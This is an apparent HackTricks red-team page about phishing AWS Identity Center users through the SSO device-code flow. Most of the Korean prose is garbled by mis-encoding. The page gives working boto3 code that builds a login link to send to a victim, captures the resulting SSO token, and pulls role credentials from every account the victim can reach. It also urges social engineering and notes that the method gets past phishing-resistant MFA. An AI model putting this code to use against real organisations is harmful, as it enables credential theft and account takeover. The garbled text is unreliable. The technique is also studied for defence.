# AWS - Identity Center & SSO Unauthenticated Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

## AWS Device Code Phishing

[**ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)ì—ì„œ ì²˜ìŒ ì œì•ˆëœ ê²ƒì²˜ëŸ¼, AWS SSOë¥¼ ì‚¬ìš©í•˜ëŠ” ì‚¬ìš©ìì—ê²Œ **ë§í¬**ë¥¼ ë³´ë‚´ë©´ **ì‚¬ìš©ìê°€ ìˆ˜ë½**í•  ê²½ìš° ê³µê²©ìê°€ **ì‚¬ìš©ìë¥¼ ê°€ì¥í•  ìˆ˜ ìˆëŠ” í† í°**ì„ ì–»ê³  **Identity Center**ì—ì„œ ì‚¬ìš©ìê°€ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì—­í• ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•œ ìš”ê±´ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* í”¼í•´ìëŠ” **Identity Center**ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
* ê³µê²©ìëŠ” í”¼í•´ìê°€ ì‚¬ìš©í•˜ëŠ” **ì„œë¸Œë„ë©”ì¸** `<victimsub>.awsapps.com/start`ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.

ì´ì „ ì •ë³´ë§Œìœ¼ë¡œë„ **ê³µê²©ìëŠ” ì‚¬ìš©ìì—ê²Œ ë§í¬ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°**, **ìˆ˜ë½**í•  ê²½ìš° **ê³µê²©ìëŠ” AWS ì‚¬ìš©ì ê³„ì •ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

### Attack

1. **ì„œë¸Œë„ë©”ì¸ ì°¾ê¸°**

ê³µê²©ìì˜ ì²« ë²ˆì§¸ ë‹¨ê³„ëŠ” í”¼í•´ íšŒì‚¬ê°€ Identity Centerì—ì„œ ì‚¬ìš©í•˜ëŠ” ì„œë¸Œë„ë©”ì¸ì„ ì°¾ëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” ëŒ€ë¶€ë¶„ì˜ íšŒì‚¬ê°€ ì—¬ê¸°ì„œ ì´ë¦„ì´ë‚˜ ì´ë¦„ì˜ ë³€í˜•ì„ ì‚¬ìš©í•  ê²ƒì´ê¸° ë•Œë¬¸ì— **OSINT** ë˜ëŠ” **ì¶”ì¸¡ + BF**ë¥¼ í†µí•´ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì •ë³´ë¡œ, Identity Centerê°€ êµ¬ì„±ëœ ì§€ì—­ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **í”¼í•´ìë¥¼ ìœ„í•œ ë§í¬ ìƒì„± ë° ì „ì†¡**

í”¼í•´ìê°€ ì¸ì¦í•  ìˆ˜ ìˆë„ë¡ AWS SSO ë¡œê·¸ì¸ ë§í¬ë¥¼ ìƒì„±í•˜ë ¤ë©´ ë‹¤ìŒ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì„¸ìš”.\
ë°ëª¨ë¥¼ ìœ„í•´ ì´ ì½”ë“œë¥¼ python ì½˜ì†”ì—ì„œ ì‹¤í–‰í•˜ê³  ë‚˜ì¤‘ì— í† í°ì„ ì–»ê¸° ìœ„í•´ ì¼ë¶€ ê°ì²´ê°€ í•„ìš”í•˜ë¯€ë¡œ ì¢…ë£Œí•˜ì§€ ë§ˆì„¸ìš”:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
Send the generated link to the victim using you awesome social engineering skills!

3. **í”¼í•´ìê°€ ìˆ˜ë½í•  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ì„¸ìš”**

í”¼í•´ìê°€ **ì´ë¯¸ AWSì— ë¡œê·¸ì¸ë˜ì–´ ìˆë‹¤ë©´** ê¶Œí•œ ë¶€ì—¬ë¥¼ ìˆ˜ë½í•˜ê¸°ë§Œ í•˜ë©´ ë˜ê³ , ë¡œê·¸ì¸ë˜ì–´ ìˆì§€ ì•Šë‹¤ë©´ **ë¡œê·¸ì¸ í›„ ê¶Œí•œ ë¶€ì—¬ë¥¼ ìˆ˜ë½**í•´ì•¼ í•©ë‹ˆë‹¤.\
í˜„ì¬ í”„ë¡¬í”„íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë³´ì…ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **SSO ì•¡ì„¸ìŠ¤ í† í° ì–»ê¸°**

í”¼í•´ìê°€ í”„ë¡¬í”„íŠ¸ë¥¼ ìˆ˜ë½í–ˆë‹¤ë©´, ì´ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ **ì‚¬ìš©ìë¥¼ ê°€ì¥í•œ SSO í† í°ì„ ìƒì„±**í•˜ì„¸ìš”:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSO access tokenì€ **8ì‹œê°„ ë™ì•ˆ ìœ íš¨**í•©ë‹ˆë‹¤.

5. **ì‚¬ìš©ì ê°€ì¥**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### í”¼ì‹± ë¶ˆê°€ëŠ¥í•œ MFA í”¼ì‹±

ì´ì „ ê³µê²©ì´ **"í”¼ì‹± ë¶ˆê°€ëŠ¥í•œ MFA" (webAuth)ë¥¼ ì‚¬ìš©í•´ë„ ì‘ë™í•œë‹¤ëŠ” ì‚¬ì‹¤ì€ ì¬ë¯¸ìˆìŠµë‹ˆë‹¤**. ì´ëŠ” ì´ì „ **ì›Œí¬í”Œë¡œìš°ê°€ ì‚¬ìš©ëœ OAuth ë„ë©”ì¸ì„ ì ˆëŒ€ ë²—ì–´ë‚˜ì§€ ì•Šê¸° ë•Œë¬¸ì…ë‹ˆë‹¤**. ë‹¤ë¥¸ í”¼ì‹± ê³µê²©ì—ì„œëŠ” ì‚¬ìš©ìê°€ ë¡œê·¸ì¸ ë„ë©”ì¸ì„ ëŒ€ì²´í•´ì•¼ í•˜ì§€ë§Œ, ì´ ê²½ìš° ë””ë°”ì´ìŠ¤ ì½”ë“œ ì›Œí¬í”Œë¡œìš°ëŠ” **ë””ë°”ì´ìŠ¤ê°€ ì½”ë“œë¥¼ ì•Œê³ ** ì‚¬ìš©ìê°€ ë‹¤ë¥¸ ê¸°ê¸°ì—ì„œë„ ë¡œê·¸ì¸í•  ìˆ˜ ìˆë„ë¡ ì¤€ë¹„ë˜ì–´ ìˆìŠµë‹ˆë‹¤. í”„ë¡¬í”„íŠ¸ë¥¼ ìˆ˜ë½í•˜ë©´, ë””ë°”ì´ìŠ¤ëŠ” **ì´ˆê¸° ì½”ë“œë¥¼ ì•Œê¸°ë§Œ í•˜ë©´** ì‚¬ìš©ìì˜ **ìê²© ì¦ëª…ì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ìì„¸í•œ ë‚´ìš©ì€ [**ì´ ê²Œì‹œë¬¼**](https://mjg59.dreamwidth.org/62175.html)ì„ ì°¸ì¡°í•˜ì„¸ìš”.

### ìë™í™” ë„êµ¬

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## ì°¸ê³  ìë£Œ

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{% hint style="success" %}
AWS í•´í‚¹ í•™ìŠµ ë° ì—°ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ í•™ìŠµ ë° ì—°ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
